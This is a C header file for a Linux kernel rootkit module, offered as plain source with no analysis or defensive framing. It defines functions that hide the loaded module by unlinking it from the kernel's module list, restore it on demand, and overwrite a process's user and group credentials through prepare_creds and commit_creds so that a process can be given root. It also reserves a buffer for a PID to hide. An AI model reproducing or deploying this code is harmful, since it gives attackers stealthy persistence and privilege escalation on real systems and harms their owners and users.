#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/limits.h>
#include <linux/list.h>
#include <linux/export.h>
#include <linux/version.h> /* Linux version check */
#include <linux/cred.h>    /* set_root */
#include <linux/types.h>

#include "usrlib.h"
#include "commands.h"

/* Hide myself */
static struct list_head *prev_module = NULL;
static bool is_hidden = false;

/* hidden pid */
static char hide_pid[NAME_MAX];

/**
 * Hide this module
 */
void hide_myself(void)
{
    if (!prev_module && !is_hidden)
    {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        is_hidden = true;
    }
}

/**
 * Show this module
 */
void show_myself(void)
{
    if (prev_module && is_hidden)
    {
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
        is_hidden = false;
    }
}

/**
 * @brief Change current user to parameter
 * @param user the uid of new user
 */
void set_user_as(int user)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
    current->uid = current->gid = user;
    current->euid = current->egid = user;
    current->suid = current->sgid = user;
    current->fsuid = current->fsgid = user;
#else
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
    newcreds->uid.val = newcreds->gid.val = user;
    newcreds->euid.val = newcreds->egid.val = user;
    newcreds->suid.val = newcreds->sgid.val = user;
    newcreds->fsuid.val = newcreds->fsgid.val = user;
#else
    newcreds->uid = newcreds->gid = user;
    newcreds->euid = newcreds->egid = user;
    newcreds->suid = newcreds->sgid = user;
    newcreds->fsuid = newcreds->fsgid = user;
#endif
    commit_creds(newcreds);
#endif
}

#endif /* ROOTKIT_H */